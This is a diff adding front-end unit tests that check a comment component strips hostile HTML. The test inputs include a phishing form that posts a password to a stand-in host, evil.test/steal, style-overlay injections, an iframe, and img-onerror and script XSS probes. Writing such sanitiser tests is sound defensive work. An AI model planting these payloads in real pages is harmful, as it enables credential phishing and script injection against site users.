@@ -113,3 +113,67 @@ describe('CommentItem (Stage B)', () => {
     expect((textarea.element as HTMLTextAreaElement).value).toBe('hello')
   })
 })
+
+describe('CommentItem 留言 HTML 消毒（收緊設定）', () => {
+  const render = (contentHtml: string) => {
+    setActivePinia(createPinia())
+    const wrapper = mount(CommentItem, { props: { comment: { ...baseComment, contentHtml } } })
+    return wrapper.find('.content').element as HTMLElement
+  }
+
+  // 一個 render 只放一個會被移除的節點：happy-dom 的 NodeIterator 在節點被移除後可能略過後續兄弟節點，
+  // 組合 payload 另以真實 Chromium 驗證。
+  it.each([
+    ['內文 <style>', '<p>a</p><style>.ov{position:fixed;inset:0}</style>'],
+    ['svg 內 <style>', '<svg><style>.ov{position:fixed;inset:0}</style></svg>'],
+  ])('%s 被移除，樣式內容不外洩成文字', (_label, html) => {
+    const el = render(html)
+
+    expect(el.querySelectorAll('style').length).toBe(0)
+    expect(el.textContent).not.toMatch(/position:\s*fixed/)
+  })
+
+  it('style 屬性一律移除，包含偽造的 pre.shiki（Shiki 例外不外洩到留言）', () => {
+    const el = render(
+      '<p style="position:fixed">a</p><pre class="shiki" style="--shiki-light:#fff"><span style="--shiki-light:#fff">b</span></pre>',
+    )
+
+    expect(el.querySelectorAll('[style]').length).toBe(0)
+  })
+
+  it('釣魚 form（含 password input 與 button）整個被移除，action 不殘留', () => {
+    const el = render(
+      '<form action="https://evil.test/steal" method="post"><input type="password"><button>Login</button></form>',
+    )
+
+    expect(el.querySelectorAll('form, input, button').length).toBe(0)
+    expect(el.querySelectorAll('[action]').length).toBe(0)
+  })
+
+  it('iframe 被移除', () => {
+    expect(render('<iframe src="about:blank"></iframe>').querySelectorAll('iframe').length).toBe(0)
+  })
+
+  it.each([
+    ['text', '<input type="text">'],
+    ['無 type', '<input>'],
+  ])('非 checkbox 的 input（%s）被移除', (_label, html) => {
+    expect(render(html).querySelectorAll('input').length).toBe(0)
+  })
+
+  it('checkbox 保留', () => {
+    const inputs = render('<input type="checkbox" checked>').querySelectorAll('input')
+
+    expect(inputs.length).toBe(1)
+    expect(inputs[0].getAttribute('type')).toBe('checkbox')
+  })
+
+  it('一般內容不受影響：段落、粗體、連結、script / on* 仍被移除', () => {
+    const el = render('<p>hi <strong>bold</strong> <a href="https://example.com">l</a></p><img src="x" onerror="alert(1)"><script>alert(1)</script>')
+
+    expect(el.querySelector('strong')?.textContent).toBe('bold')
+    expect(el.querySelector('a')?.getAttribute('href')).toBe('https://example.com')
+    expect(el.querySelectorAll('script').length).toBe(0)
+    expect(el.querySelector('img')?.hasAttribute('onerror')).toBe(false)
+  })
+})
